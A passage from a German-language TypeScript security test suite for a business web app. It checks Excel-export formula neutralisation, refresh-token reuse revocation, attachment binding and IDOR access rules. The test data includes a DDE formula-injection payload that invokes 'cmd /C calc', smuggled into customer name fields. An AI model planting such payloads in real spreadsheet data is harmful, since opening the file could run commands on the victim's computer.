  const PLUS = '+SUMME(A1:A9)';
  const AT = '@SUMME(1+1)*cmd|\' /C calc\'!A0';
  /** Wie `src/lib/csv.ts`: Formelanfang, ausser eine reine Zahl. */
  const FORMELANFANG = /^[=+\-@\t\r]/;
  const REINE_ZAHL = /^[+-]?\d+(?:[.,]\d+)?$/;

  before(async () => {
    const r = await post(
      '/api/customers',
      {
        type: 'BUSINESS',
        companyName: AT,
        firstName: FORMEL,
        lastName: PLUS,
        email: adresse('formel'),
        language: 'DE',
        paymentTermDays: 30,
        discountPercent: 0,
        taxExempt: false,
        tagIds: [],
        createLogin: false,
      },
      { jar: jars.admin },
    );
    assert.equal(r.status, 201, r.text);
  });

  /**
   * Die Regel steht in `src/lib/csv.ts` und gilt dort für die Buchhaltung.
   * Der Excel-Export trägt dieselben Freitexte (Firma, Name) und wird in
   * derselben Tabellenkalkulation geöffnet. ExcelJS schreibt eine Zeichenkette
   * als Textzelle, nicht als Formel — beim Öffnen wird also nichts ausgewertet.
   * Aber ein Doppelklick in die Zelle und Enter macht aus `=HYPERLINK(…)` eine
   * lebende Formel; darum dieselbe Entschärfung wie im CSV: ein Apostroph
   * davor (oder das Zellformat „Text mit Präfix"). Geprüft wird beides — keine
   * Formelzelle im ganzen Blatt, und die eingeschleusten Werte entschärft.
   */
  it('keine Zelle ist eine Formel, und = + @ am Anfang eines Freitexts sind entschärft', async () => {
    const antwort = await fetch(`${BASE_URL}/api/exports/kunden`, { headers: { cookie: jars.admin } });
    assert.equal(antwort.status, 200);
    const mappe = new ExcelJS.Workbook();
    await mappe.xlsx.load(Buffer.from(await antwort.arrayBuffer()) as unknown as Parameters<typeof mappe.xlsx.load>[0]);
    const blatt = mappe.worksheets[0];
    assert.ok(blatt, 'der Export enthält kein Blatt');

    const kopf = blatt.getRow(1);
    const spalte = (titel: string) => {
      let nr = 0;
      kopf.eachCell((zelle, i) => {
        if (String(zelle.value) === titel) nr = i;
      });
      assert.ok(nr > 0, `Spalte „${titel}" fehlt`);
      return nr;
    };
    const [firma, vorname, nachname, email] = ['Firma', 'Vorname', 'Nachname', 'E-Mail'].map(spalte);

    blatt.eachRow((zeile) => {
      zeile.eachCell((zelle) => {
        assert.notEqual(zelle.type, ExcelJS.ValueType.Formula, `Formelzelle ${zelle.address}`);
      });
    });

    let gefunden = false;
    blatt.eachRow((zeile, nr) => {
      if (nr === 1 || String(zeile.getCell(email!).value) !== adresse('formel')) return;
      gefunden = true;
      for (const [nr2, roh] of [[firma!, AT], [vorname!, FORMEL], [nachname!, PLUS]] as const) {
        const zelle = zeile.getCell(nr2);
        const wert = typeof zelle.value === 'string' ? zelle.value : String(zelle.value ?? '');
        const praefixFormat = Boolean((zelle.style as { quotePrefix?: boolean } | undefined)?.quotePrefix);
        assert.ok(wert.includes(roh.slice(1)), `${zelle.address}: Wert fehlt (${wert.slice(0, 40)})`);
        assert.ok(
          praefixFormat || !FORMELANFANG.test(wert) || REINE_ZAHL.test(wert),
          `${zelle.address} beginnt mit einem Formelzeichen: ${wert.slice(0, 40)}`,
        );
      }
    });
    assert.ok(gefunden, 'die eingeschleuste Kundschaft steht nicht im Export');
  });
});

// ===========================================================================
//  7  Wiederverwendung eines rotierten Erneuerungstokens
// ===========================================================================

describe('Refresh-Token — Wiederverwendung sperrt die Familie', () => {
  /**
   * Auf einer **frischen** Anmeldung: Die Sperre trifft die ganze Familie,
   * und die Familie des Sitzungs-Caches gehört allen Dateien der Reihe.
   *
   * Gewartet wird länger als `ROTATIONS_KULANZ_MS` (10 s,
   * `session-refresh.service.ts`): Innerhalb dieser Frist gilt ein zweites
   * Vorlegen als verlorener Wettlauf zweier Tabs und wird nur abgewiesen. Erst
   * danach ist es, was dieser Fall prüfen soll — eine Kopie in fremder Hand.
   */
  it('ein rotierter Token, nach der Kulanzfrist erneut vorgelegt, macht auch den neuesten ungültig', async () => {
    const frisch = await login(ACCOUNTS.customer.email, ACCOUNTS.customer.password);
    assert.equal(frisch.status, 200, frisch.text);
    const alt = refreshOnly(frisch.jar);
    assert.ok(alt, 'kein Refresh-Cookie nach der Anmeldung');

    const rotiert = await post('/api/auth/refresh', undefined, { jar: alt });
    assert.equal(rotiert.status, 200, rotiert.text);
    const neu = refreshOnly(rotiert.cookies);
    assert.ok(neu && neu !== alt, 'die Rotation lieferte keinen neuen Token');

    await sleep(10_500);

    const wiederverwendet = await post('/api/auth/refresh', undefined, { jar: alt });
    assert.equal(wiederverwendet.status, 401, 'ein verbrauchter Token wurde ein zweites Mal eingelöst');

    const danach = await post('/api/auth/refresh', undefined, { jar: neu });
    assert.equal(danach.status, 401, 'der neueste Token der Familie lebt nach der Wiederverwendung weiter');

    // Und die Datenbank sagt dasselbe: kein unwiderrufener Token dieser Familie.
    const hash = createHash('sha256').update(neu.split('=').slice(1).join('=')).digest('hex');
    const eintrag = await db().refreshToken.findUnique({ where: { tokenHash: hash }, select: { family: true } });
    if (eintrag) {
      assert.equal(await db().refreshToken.count({ where: { family: eintrag.family, revokedAt: null } }), 0);
    }
  });
});

// ===========================================================================
//  8  Dateien: kein zweites Binden, keine fremden Uploads
// ===========================================================================

describe('Dateibindung — gebunden bleibt gebunden, fremd bleibt fremd', () => {
  let verlaufId = '';
  let ersteAntwortId = '';
  let kundenDatei = { id: '', url: '' };
  let kundenDateiUngebunden = { id: '', url: '' };
  let buerodatei = { id: '', url: '' };
  let galerie: { id: string; beforeUrl: string } | null = null;

  before(async () => {
    kundenDatei = await hochladen(jars.customer, 'anhang-kunde.pdf');
    kundenDateiUngebunden = await hochladen(jars.customer, 'anhang-kunde-2.pdf');
    buerodatei = await hochladen(jars.admin, 'anhang-buero.pdf');
    verlaufId = await verlaufEroeffnen(jars.customer, `${MARKE} Anhänge`);
    galerie = await db().galleryItem.findFirst({ where: { organizationId: orgId }, select: { id: true, beforeUrl: true } });
  });

  after(async () => {
    if (galerie) await testDb()?.galleryItem.update({ where: { id: galerie.id }, data: { beforeUrl: galerie.beforeUrl } });
  });

  it('ein eigener Anhang bindet einmal — ein zweites Binden scheitert samt Nachricht', async () => {
    const erste = await post<{ data: { id: string } }>(`/api/messages/${verlaufId}`, { body: 'mit Anhang', fileIds: [kundenDatei.id] }, { jar: jars.customer });
    assert.equal(erste.status, 201, erste.text);
    ersteAntwortId = data(erste).id;

    const zweite = await post(`/api/messages/${verlaufId}`, { body: 'derselbe Anhang noch einmal', fileIds: [kundenDatei.id] }, { jar: jars.customer });
    assert.ok([404, 409, 422].includes(zweite.status), `zweites Binden: HTTP ${zweite.status}`);
    assert.equal((await db().fileAsset.findUniqueOrThrow({ where: { id: kundenDatei.id } })).messageId, ersteAntwortId, 'die Datei wurde umgehängt');
    assert.equal(await db().message.count({ where: { threadId: verlaufId } }), 2, 'die zweite Antwort entstand ohne ihren Anhang');
  });

  it('der Upload einer anderen Person lässt sich nicht als Anhang binden', async () => {
    const r = await post(`/api/messages/${verlaufId}`, { body: 'mit fremdem Anhang', fileIds: [buerodatei.id] }, { jar: jars.customer });
    assert.ok([403, 404, 422].includes(r.status), `fremder Upload: HTTP ${r.status}`);
    assert.equal((await db().fileAsset.findUniqueOrThrow({ where: { id: buerodatei.id } })).messageId, null);
    assert.equal(await db().message.count({ where: { threadId: verlaufId } }), 2);
  });

  /**
   * Dieselbe Regel auf dem Weg der Führungsablage. `dateienBinden` ist „der
   * eine Weg" für Buchung, Beleg und Nachricht — die Ablage bindet über
   * `beanspruchteDatei` und fragt dort weder nach der hochladenden Person noch
   * danach, ob die Datei schon an einer Nachricht hängt. Erwartet ist, was für
   * die anderen Wege gilt: Eine Kennung ist keine Berechtigung.
   */
  it('ein bereits an eine Nachricht gebundener Anhang wird nicht zur Fassung einer Führungsakte', async () => {
    const titel = `${MARKE} Akte mit fremdem Anhang`;
    const r = await post('/api/bi/documents', { title: titel, category: 'INSURANCE', fileId: kundenDatei.id }, { jar: jars.admin });
    assert.ok([403, 404, 409, 422].includes(r.status), `gebundene Datei als Fassung: HTTP ${r.status}`);
    assert.equal(await db().documentVersion.count({ where: { fileAssetId: kundenDatei.id } }), 0, 'die Nachrichtendatei hängt jetzt auch an einer Akte');
    assert.equal(await db().managedDocument.count({ where: { title: titel } }), 0, 'die Akte entstand trotzdem');
  });

  it('der ungebundene Upload einer Kundin wird nicht zur Fassung einer Führungsakte', async () => {
    const titel = `${MARKE} Akte mit Kundenupload`;
    const r = await post('/api/bi/documents', { title: titel, category: 'INSURANCE', fileId: kundenDateiUngebunden.id }, { jar: jars.admin });
    assert.ok([403, 404, 409, 422].includes(r.status), `fremder Upload als Fassung: HTTP ${r.status}`);
    assert.equal(await db().documentVersion.count({ where: { fileAssetId: kundenDateiUngebunden.id } }), 0);
  });

  it('eine Fassung bindet ihre Datei einmal — weder eine zweite Akte noch eine zweite Fassung bekommen sie', async () => {
    const datei = await hochladen(jars.admin, 'police.pdf');
    const erste = await post<{ data: { id: string } }>('/api/bi/documents', { title: `${MARKE} Police A`, category: 'INSURANCE', fileId: datei.id }, { jar: jars.admin });
    assert.equal(erste.status, 201, erste.text);

    const zweiteAkte = await post('/api/bi/documents', { title: `${MARKE} Police B`, category: 'INSURANCE', fileId: datei.id }, { jar: jars.admin });
    assert.ok([404, 409, 422].includes(zweiteAkte.status), `zweite Akte: HTTP ${zweiteAkte.status}`);
    const zweiteFassung = await post(`/api/bi/documents/${data(erste).id}/versions`, { fileId: datei.id }, { jar: jars.admin });
    assert.ok([404, 409, 422].includes(zweiteFassung.status), `zweite Fassung: HTTP ${zweiteFassung.status}`);
    assert.equal(await db().documentVersion.count({ where: { fileAssetId: datei.id } }), 1);
  });

  /**
   * Ein Website-Bildfeld ist öffentlich; ein Nachrichtenanhang ist es nicht.
   * Die Adresse einer privaten Datei in ein öffentliches Feld zu schreiben
   * bindet sie ein zweites Mal — an einen Ort, dessen Sichtbarkeit eine andere
   * ist. Die Berechtigung entsteht auf der fachlichen Ebene (C12), nicht durch
   * die Kenntnis einer Adresse.
   */
  it('die Adresse eines privaten Anhangs wird nicht zum Website-Bild', async () => {
    assert.ok(galerie, 'kein Galerieeintrag im Bestand');
    const r = await patch(
      '/api/content/asset',
      { entity: 'galleryItem', id: galerie.id, field: 'beforeUrl', url: kundenDatei.url },
      { jar: jars.admin },
    );
    assert.ok([403, 404, 409, 422].includes(r.status), `privater Anhang als Galeriebild: HTTP ${r.status}`);
    assert.equal((await db().galleryItem.findUniqueOrThrow({ where: { id: galerie.id } })).beforeUrl, galerie.beforeUrl);
  });
});

// ===========================================================================
//  9  IDOR: fremde Datensätze über ihre Kennung
// ===========================================================================

describe('IDOR — fremde Kennungen öffnen nichts', () => {
  it('die Kundschaft liest keine fremde Buchung — weder Daten noch PDF noch Seite', async () => {
    const eigene = await eigeneKundeId();
    const fremd = await db().booking.findFirst({
      where: { organizationId: orgId, deletedAt: null, customerId: { not: eigene } },
      select: { id: true, number: true },
    });
    assert.ok(fremd, 'keine fremde Buchung im Bestand');

    const unbekannt = await get(`/api/bookings/${UNBEKANNT}`, { jar: jars.customer });
    const antwort = await get(`/api/bookings/${fremd.id}`, { jar: jars.customer });
    assert.equal(antwort.status, 404, `fremde Buchung: HTTP ${antwort.status}`);
    assert.equal(antwort.status, unbekannt.status, 'fremd und unbekannt sehen verschieden aus');
    assert.ok(!antwort.text.includes(fremd.number), 'die Buchungsnummer steht in der Antwort');

    assert.equal((await get(`/api/bookings/${fremd.id}/pdf`, { jar: jars.customer })).status, 404);
    const seite = await get(`/konto/buchungen/${fremd.id}`, { jar: jars.customer });
    assert.equal(seite.status, 404, `Kundenseite einer fremden Buchung: HTTP ${seite.status}`);
    assert.ok(!seite.text.includes(fremd.number));
  });

  /**
   * Ein Filter verengt die Sicht, er ersetzt sie nicht (2026-09-27). Die
   * Objektliste verbreitete Sichtregel und `?customerId=` in dasselbe Objekt,
   * und der Filter überschrieb das `customerId` der Sichtregel. Gegen den
   * alten Stand: die Objekte der anderen Kundschaft, samt Schlüsseldepot.
   */
  it('die Kundschaft listet mit ?customerId= keine Objekte einer anderen Kundschaft', async () => {
    const eigene = await eigeneKundeId();
    const fremdesObjekt = await db().property.findFirst({
      where: { customer: { organizationId: orgId }, customerId: { not: eigene } },
      select: { id: true, customerId: true },
    });
    assert.ok(fremdesObjekt, 'kein Objekt einer anderen Kundschaft im Bestand');
    const antwort = await get(`/api/properties?customerId=${fremdesObjekt.customerId}`, { jar: jars.customer });
    assert.equal(antwort.status, 200, antwort.text);
    assert.ok(!antwort.text.includes(fremdesObjekt.id), 'ein fremdes Objekt steht in der Liste');
    assert.deepEqual(data(antwort as never), [], 'mit fremder Kundenkennung darf nichts übrig bleiben');
  });

  /**
   * Dieselbe Bugklasse an der Qualitätskontrolle: `?status=DRAFT`
   * überschrieb das `status: COMPLETED` der Sichtregel, und die Kundschaft
   * sah interne Entwürfe ihrer Begehungen.
   */
  it('die Kundschaft sieht mit ?status=DRAFT keine Entwürfe von Qualitätskontrollen', async () => {
    const eigene = await eigeneKundeId();
    const objekt = await db().property.findFirst({ where: { customerId: eigene }, select: { id: true } });
    assert.ok(objekt, 'das Demo-Kundenkonto hat kein Objekt');
    const entwurf = await db().qualityInspection.create({
      data: { organizationId: orgId, propertyId: objekt.id, status: 'DRAFT', inspectedAt: new Date(), internalNote: `${MARKE} Entwurf` },
      select: { id: true },
    });
    try {
      const antwort = await get('/api/quality-inspections?status=DRAFT', { jar: jars.customer });
      assert.equal(antwort.status, 200, antwort.text);
      assert.ok(!antwort.text.includes(entwurf.id), 'ein interner Entwurf steht in der Kundenliste');
    } finally {
      await db().qualityInspection.delete({ where: { id: entwurf.id } });
    }
  });

  /**
   * Und an der Zeitachse der Ziele: Das `OR` des Zeitraums überschrieb das
   * `OR` der Sichtregel; wer nur `objective:read_own` hat, sah die Ziele
   * aller — auch die persönlichen anderer.
   */
  it('Mitarbeitende sehen in der Zeitachse keine fremden persönlichen Ziele', async () => {
    const chef = await db().user.findFirstOrThrow({ where: { email: ACCOUNTS.admin.email }, select: { id: true } });
    const fremdesZiel = await db().objective.create({
      data: {
        organizationId: orgId,
        title: `${MARKE} persönliches Ziel`,
        level: 'PERSONAL',
        status: 'ACTIVE',
        ownerId: chef.id,
        startsOn: new Date(Date.UTC(new Date().getUTCFullYear(), 0, 1)),
        endsOn: new Date(Date.UTC(new Date().getUTCFullYear(), 11, 31)),
      },
      select: { id: true },
    });
    try {
      const antwort = await get('/api/bi/objectives/timeline', { jar: jars.employee });
      assert.equal(antwort.status, 200, antwort.text);
      assert.ok(!antwort.text.includes(fremdesZiel.id), 'ein fremdes persönliches Ziel steht in der Zeitachse');
      // Gegenprobe: Die Verwaltung sieht es — sonst bewiese die Abwesenheit nichts.
      assert.ok((await get('/api/bi/objectives/timeline', { jar: jars.admin })).text.includes(fremdesZiel.id), 'Gegenprobe: die Verwaltung sieht das Ziel nicht');
    } finally {
      await db().objective.delete({ where: { id: fremdesZiel.id } });
    }
  });

  /**
   * C19: „nicht gefunden" und „nicht berechtigt" sehen gleich aus, wo die
   * Unterscheidung die Existenz eines Datensatzes verriete. Ein 403 auf eine
   * fremde, ein 404 auf eine erfundene Kennung ist genau so ein Orakel.
   */
  it('die Kundschaft liest keinen fremden Nachrichtenverlauf und schreibt nicht hinein', async () => {
    const eigene = await eigeneKundeId();
    const fremdeKundschaft = await db().customer.findFirst({
      where: { organizationId: orgId, deletedAt: null, id: { not: eigene } },
      select: { id: true },
    });
    assert.ok(fremdeKundschaft, 'keine zweite Kundschaft im Bestand');
    const fremd = await db().messageThread.create({
      data: {
        organizationId: orgId,
        customerId: fremdeKundschaft.id,
        subject: `${MARKE} fremder Verlauf`,
        messages: { create: { authorType: 'STAFF', body: `${MARKE}: vertraulicher Inhalt einer anderen Kundschaft` } },
      },
      select: { id: true },
    });

    const unbekannt = await get(`/api/messages/${UNBEKANNT}`, { jar: jars.customer });
    const lesen = await get(`/api/messages/${fremd.id}`, { jar: jars.customer });
    assert.ok([403, 404].includes(lesen.status), `fremder Verlauf: HTTP ${lesen.status}`);
    assert.ok(!lesen.text.includes('vertraulicher Inhalt'), 'der fremde Inhalt steht in der Antwort');
    assert.equal(lesen.status, unbekannt.status, `fremd (${lesen.status}) und unbekannt (${unbekannt.status}) sind unterscheidbar`);

    const liste = await get('/api/messages?status=all', { jar: jars.customer });
    assert.ok(!liste.text.includes(fremd.id), 'der fremde Verlauf steht in der Liste der Kundschaft');

    const schreiben = await post(`/api/messages/${fremd.id}`, { body: 'Eingeschleuste Antwort' }, { jar: jars.customer });
    assert.ok([403, 404].includes(schreiben.status), `Antwort in fremden Verlauf: HTTP ${schreiben.status}`);
    assert.equal(await db().message.count({ where: { threadId: fremd.id } }), 1, 'die Antwort steht im fremden Verlauf');
  });

  it('Mitarbeitende lesen und ändern keine Zeiten einer anderen Person', async () => {
    const fremdePerson = await db().employee.findFirst({
      where: { organizationId: orgId, terminatedAt: null, user: { email: { not: ACCOUNTS.employee.email }, status: 'ACTIVE' } },
      select: { id: true },
    });
    assert.ok(fremdePerson, 'keine zweite Personalakte im Bestand');

    // Ein Fenster weit in der Vergangenheit, ausserhalb der Fenster von `zeiterfassung.test.ts`.
    const start = new Date();
    start.setUTCDate(start.getUTCDate() - 47);
    start.setUTCHours(3, 0, 0, 0);
    const angelegt = await post<{ data: { id: string } }>(
      '/api/time',
      { employeeId: fremdePerson.id, startedAt: start.toISOString(), endedAt: new Date(start.getTime() + 3_600_000).toISOString(), breakMin: 0, note: MARKE },
      { jar: jars.admin },
    );
    assert.equal(angelegt.status, 201, angelegt.text);
    const eintragId = data(angelegt).id;

    try {
      const liste = await get(`/api/time?employeeId=${fremdePerson.id}`, { jar: jars.employee });
      assert.equal(liste.status, 403, `Liste fremder Zeiten: HTTP ${liste.status}`);
      assert.ok(!liste.text.includes(eintragId));

      const exportiert = await get('/api/exports/zeiterfassung', { jar: jars.employee });
      assert.equal(exportiert.status, 403, `Export fremder Zeiten: HTTP ${exportiert.status}`);

      assert.equal((await patch(`/api/time/${eintragId}`, { breakMin: 30 }, { jar: jars.employee })).status, 403);
      assert.equal((await post(`/api/time/${eintragId}/reopen`, undefined, { jar: jars.employee })).status, 403);
      assert.equal((await del(`/api/time/${eintragId}`, { jar: jars.employee })).status, 403);

      const gespeichert = await db().timeEntry.findUnique({ where: { id: eintragId }, select: { breakMin: true } });
      assert.ok(gespeichert, 'die fremde Zeit wurde gelöscht');
      assert.equal(gespeichert.breakMin, 0, 'die fremde Zeit wurde geändert');
    } finally {
      await del(`/api/time/${eintragId}`, { jar: jars.admin }).catch(() => undefined);
    }
  });

  /**
   * B-01 (2026-09-28): `createInvoice` übernahm `bookingId` und `quoteId`
   * ungeprüft. Eine Rechnung an Kundschaft B mit der Buchung von A hing an
   * As Buchung, und As Kundenkonto zeigte sie samt Betrag und Saldo. Gegen den
   * alten Stand: 201 und eine Rechnung mit fremdem Bezug im Bestand.
   */
  /*
    Seit 2026-09-29 mit eigenen Fixturen statt Demobestand: Der alte Fall
    suchte „irgendeine fremde Buchung" und prüfte die Gegenprobe nur, wenn der
    Bestand zufällig eine eigene Buchung hatte (`if (eigeneBuchung)`) — ohne
    sie lief er still grün. Jetzt legt der Fall alles selbst an: Kundschaft A
    und B der eigenen Organisation, Kundschaft C einer fremden, je mit einer
    Buchung und einer Offerte. Sechs Fälle, keiner bedingt.
  */
  it('eine Rechnung nimmt keine Buchung und keine Offerte einer anderen Kundschaft oder Organisation an', async () => {
    const fremdeOrg = await fremdeOrganisation();
    assert.ok(fremdeOrg, 'keine fremde Prüforganisation');
    const lauf = `${Date.now()}`;
    const notiz = `${MARKE} Rechnungsbezug ${lauf}`;
    const kunde = (organizationId: string, name: string) =>
      db().customer.create({
        data: { organizationId, number: `K-PRUEF-${name}-${lauf}`, firstName: 'Prüf', lastName: `Bezug ${name}`, email: `bezug-${name.toLowerCase()}-${lauf}@example.ch` },
        select: { id: true },
      });
    const buchung = (organizationId: string, customerId: string, name: string) =>
      db().booking.create({
        data: {
          organizationId,
          customerId,
          number: `B-PRUEF-${name}-${lauf}`,
          scheduledStart: new Date(Date.now() + 7 * 86_400_000),
          scheduledEnd: new Date(Date.now() + 7 * 86_400_000 + 7_200_000),
          durationMin: 120,
        },
        select: { id: true },
      });
    const offerte = (organizationId: string, customerId: string, name: string) =>
      db().quote.create({
        data: { organizationId, customerId, number: `O-PRUEF-${name}-${lauf}`, title: `Prüfofferte ${name}`, validUntil: new Date(Date.now() + 30 * 86_400_000) },
        select: { id: true },
      });

    const kundeA = await kunde(orgId, 'A');
    const kundeB = await kunde(orgId, 'B');
    const kundeC = await kunde(fremdeOrg, 'C');
    const [buchungA, buchungB, buchungC] = await Promise.all([
      buchung(orgId, kundeA.id, 'A'),
      buchung(orgId, kundeB.id, 'B'),
      buchung(fremdeOrg, kundeC.id, 'C'),
    ]);
    const [offerteA, offerteB, offerteC] = await Promise.all([
      offerte(orgId, kundeA.id, 'A'),
      offerte(orgId, kundeB.id, 'B'),
      offerte(fremdeOrg, kundeC.id, 'C'),
    ]);

    const rechnungFuerA = (bezug: Record<string, string>) =>
      post<{ data: { id: string } }>('/api/invoices', {
        customerId: kundeA.id,
        notes: notiz,
        items: [{ name: 'Unterhaltsreinigung', quantity: 1, unit: 'Std.', unitPrice: 50, vatRate: 8.1 }],
        issueImmediately: false,
        ...bezug,
      }, { jar: jars.admin });

    try {
      for (const [fall, bezug] of [
        ['Buchung einer fremden Organisation', { bookingId: buchungC.id }],
        ['Offerte einer fremden Organisation', { quoteId: offerteC.id }],
        ['Buchung einer anderen Kundschaft', { bookingId: buchungB.id }],
        ['Offerte einer anderen Kundschaft', { quoteId: offerteB.id }],
      ] as const) {
        const antwort = await rechnungFuerA(bezug);
        assert.equal(antwort.status, 404, `${fall}: HTTP ${antwort.status} ${antwort.text}`);
      }
      assert.equal(await db().invoice.count({ where: { notes: notiz } }), 0, 'eine Rechnung mit fremdem Bezug ist entstanden');

      // Gegenproben: der passende Bezug wird angenommen und genau so gespeichert.
      // Gespeichert geprüft, nicht an der Antwort: Sie trägt die Bezüge nicht.
      const mitBuchung = await rechnungFuerA({ bookingId: buchungA.id });
      assert.equal(mitBuchung.status, 201, `eigene Buchung: ${mitBuchung.text}`);
      const gespeichertB = await db().invoice.findUniqueOrThrow({ where: { id: data(mitBuchung).id }, select: { bookingId: true, customerId: true } });
      assert.deepEqual(gespeichertB, { bookingId: buchungA.id, customerId: kundeA.id });
      const mitOfferte = await rechnungFuerA({ quoteId: offerteA.id });
      assert.equal(mitOfferte.status, 201, `eigene Offerte: ${mitOfferte.text}`);
      const gespeichertO = await db().invoice.findUniqueOrThrow({ where: { id: data(mitOfferte).id }, select: { quoteId: true, customerId: true } });
      assert.deepEqual(gespeichertO, { quoteId: offerteA.id, customerId: kundeA.id });
      assert.equal(await db().invoice.count({ where: { notes: notiz } }), 2);
    } finally {
      const rechnungen = (await db().invoice.findMany({ where: { notes: notiz }, select: { id: true } })).map((r) => r.id);
      await schutzfreiAufraeumen(async (tx) => {
        await tx.invoiceItem.deleteMany({ where: { invoiceId: { in: rechnungen } } });
        await tx.invoice.deleteMany({ where: { id: { in: rechnungen } } });
        await tx.booking.deleteMany({ where: { id: { in: [buchungA.id, buchungB.id, buchungC.id] } } });
        await tx.quote.deleteMany({ where: { id: { in: [offerteA.id, offerteB.id, offerteC.id] } } });
        await tx.customer.deleteMany({ where: { id: { in: [kundeA.id, kundeB.id, kundeC.id] } } });
      });
    }
  });

  /**
   * B-12 (2026-09-28): Für die Kundschaft prüfte `openThread` an der
   * Einsatz-ID nur die Organisation. Ein Kundenkonto hängte seinen Verlauf an
   * den Einsatz einer anderen Kundschaft. Gegen den alten Stand: 201.
   */
  it('die Kundschaft eröffnet keinen Nachrichtenverlauf zu einem fremden Einsatz', async () => {
    const eigene = await eigeneKundeId();
    const fremderEinsatz = await db().job.findFirst({
      where: { organizationId: orgId, deletedAt: null, customerId: { not: eigene } },
      select: { id: true },
    });
    assert.ok(fremderEinsatz, 'kein fremder Einsatz im Bestand');
    const betreff = `${MARKE} Verlauf an fremdem Einsatz`;
    try {
      const antwort = await post('/api/messages', { subject: betreff, body: 'Eingeschleust', jobId: fremderEinsatz.id }, { jar: jars.customer });
      assert.equal(antwort.status, 404, `Verlauf an fremdem Einsatz: HTTP ${antwort.status} ${antwort.text}`);
      assert.equal(await db().messageThread.count({ where: { subject: betreff } }), 0, 'der Verlauf ist am fremden Einsatz entstanden');
    } finally {
      const verlaeufe = await db().messageThread.findMany({ where: { subject: betreff }, select: { id: true } });
      for (const v of verlaeufe) {
        await db().message.deleteMany({ where: { threadId: v.id } });
        await db().messageThread.delete({ where: { id: v.id } });
      }
    }
  });
});
